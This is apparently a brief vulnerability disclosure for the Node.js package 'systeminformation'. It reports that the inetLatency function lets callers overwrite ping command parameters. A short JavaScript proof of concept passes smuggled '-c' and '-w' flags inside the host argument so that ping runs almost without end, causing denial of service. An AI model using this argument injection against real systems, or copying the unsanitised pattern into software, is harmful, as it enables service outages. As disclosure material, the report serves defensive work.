# Description

`systeminformation` is vulnerable to Denial of Service.

It is possible to overwrite the ping command parameters, which results in too long execution.

# Proof of Concept

Create a .js file with the content below and run it.

```javascript
const si = require('systeminformation');
si.inetLatency("-c 10000000000 -w 999999999 effectrenan.com").then((a) => { console.log(a) })
```
